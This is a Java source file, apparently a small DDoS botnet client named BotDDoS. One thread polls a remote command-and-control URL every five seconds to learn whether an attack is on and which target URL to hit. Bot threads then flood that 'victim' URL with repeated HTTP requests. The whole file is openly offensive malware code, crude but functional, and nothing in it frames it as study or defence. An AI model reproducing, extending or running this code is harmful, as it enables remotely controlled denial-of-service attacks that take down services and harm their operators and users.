import java.util.concurrent.TimeUnit;
import java.io.*;    
import java.net.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
public class BotDDoS 
  {  
    static AtomicBoolean running = new AtomicBoolean(false);
    static String command="";
    public static void main(String... args) throws Exception 
      {
      BotSync syn=new BotSync();    
      syn.start();
      for (int i = 0; i < 1; i++) 
          {
          BOT bot=new BOT();    
          bot.start();
          }
      } 
 
    public static class BOT extends Thread 
      {
      URL victim;
      public void run() 
       { 
       while (true) 
        {
        try 
          {         
          if(running.get())
              {
              victim = new URL(command);
              System.out.println("Attacking "+ command);
              launchAttack();   
              Thread.sleep(100);
              }
          }
        catch (Exception e) {} 
        } 
      } 
    public void launchAttack() throws Exception 
      {
      HttpURLConnection con = (HttpURLConnection) victim.openConnection();
      System.out.println(this);
      con.getInputStream();
      } 
    }

    public static class BotSync extends Thread 
      {
      public BotSync() throws Exception 
        {
        } 
      public void run() 
       { 
           while(true)
              {
              try 
                 {
                 URL url = new URL("http://dacafdataset.com/state.txt");
                 BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
                 int line= Integer.parseInt(in.readLine());
                 if(line==0)
                    {
                    running.set(false);
                    System.out.println("Attack is inactive");
                    }
                 else
                    {
                    running.set(true);
                    System.out.println("Attack is active");
                    }
                 command = in.readLine();
                 command = in.readLine();
                 in.close();
                Thread.sleep(5000);
                }
             catch (Exception e) { }
             }
       } 
    }
 }  